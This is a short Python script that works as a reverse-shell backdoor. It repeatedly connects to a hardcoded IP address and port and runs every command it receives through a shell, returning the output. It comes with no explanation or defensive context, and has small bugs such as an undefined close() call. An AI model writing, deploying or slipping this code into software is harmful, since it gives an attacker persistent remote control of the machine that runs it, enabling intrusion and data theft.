import socket
import time
import subprocess

ip = '192.168.0.104'
po = 4000


def c(ip, po):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, po))
		s.send('connected#~\n')
		return(s)

	except Exception as e:
		print('<<Error>>\nTrying Again...')
		return None

def listen(s):
	try:
		while True:
			data = s.recv(1024)
			if data[:-1] == '/exit':
				close()
				exit(0)
			else:
				cmd(s, data)

	except:
		error(s)


def error(s):
	if s:
		s.close()
	main()

def cmd(s, data):
	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out =proc.stdout.read() + proc.stderr.read()
	s.send(out)

def main():
	while True:
		connected = c(ip, po)
		if connected:
			listen(connected)
		else:
			time.sleep(3)


main()

